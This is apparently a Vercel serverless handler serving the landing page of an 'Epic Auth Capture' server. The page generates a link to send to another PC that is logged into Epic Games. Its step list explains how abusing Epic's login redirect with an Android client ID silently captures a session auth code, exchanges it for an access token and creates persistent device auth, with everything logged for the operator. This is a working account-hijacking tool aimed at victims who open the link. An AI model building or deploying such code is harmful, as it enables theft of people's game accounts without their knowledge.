/**
 * GET /
 * Landing page — shows a test link you can open or send to another PC.
 * All state is in-memory (no DB), everything logged to console (Vercel logs).
 */

export default function handler(req, res) {
  const base = `https://${req.headers.host}`;
  const testDiscordId = 'TEST_USER_123';
  const startUrl = `${base}/start?discord_id=${testDiscordId}`;

  console.log('[INDEX] Landing page hit from', req.headers['x-forwarded-for'] || 'local');

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html>
<head>
  <title>Epic Auth Capture — Test</title>
  <style>
    body { background: #0d0d0d; color: #e0e0e0; font-family: monospace; padding: 40px; max-width: 800px; margin: auto; }
    h1 { color: #00ff99; }
    h2 { color: #aaa; font-size: 1em; font-weight: normal; margin-top: 0; }
    a { color: #00aaff; word-break: break-all; }
    .box { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 20px; margin: 20px 0; }
    .label { color: #888; font-size: 0.85em; margin-bottom: 6px; }
    .code { color: #00ff99; font-size: 0.95em; word-break: break-all; }
    .note { color: #666; font-size: 0.85em; margin-top: 12px; }
    .btn { display: inline-block; background: #00ff99; color: #000; padding: 12px 24px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 16px; }
  </style>
</head>
<body>
  <h1>🎮 Epic Auth Capture — Test Server</h1>
  <h2>Vercel-hosted · no DB · everything logged to console</h2>

  <div class="box">
    <div class="label">TEST LINK — open this on a PC that is logged into Epic Games:</div>
    <div class="code"><a href="${startUrl}">${startUrl}</a></div>
    <a class="btn" href="${startUrl}">Click to Test (this machine)</a>
    <div class="note">
      Or copy the link and open it on another PC / browser that has an Epic Games session.<br>
      The auth code will be captured and printed in Vercel logs.
    </div>
  </div>

  <div class="box">
    <div class="label">How it works:</div>
    <pre style="color:#ccc;margin:0;font-size:0.85em">
1. /start generates a state token (in-memory, no DB)
2. Redirects browser to:
   epicgames.com/id/login
     ?redirectUrl=epicgames.com/id/api/redirect
                    ?clientId=3f69e56c... (Android client)
                    &amp;responseType=code
                    &amp;redirectUrl=THIS_SERVER/callback
                    &amp;state=STATE_TOKEN
3. Epic sees user is logged in → skips login page
4. /id/api/redirect captures their session → 302 to /callback?code=AUTH_CODE&amp;state=...
5. /callback logs the code, exchanges it for an access token, creates device auth
6. ALL printed to Vercel function logs — check your dashboard
    </pre>
  </div>

  <div class="box">
    <div class="label">Check logs at:</div>
    <div class="code">Vercel Dashboard → Your Project → Functions → Logs</div>
    <div class="note">Or run: vercel logs --follow (in terminal)</div>
  </div>
</body>
</html>`);
}
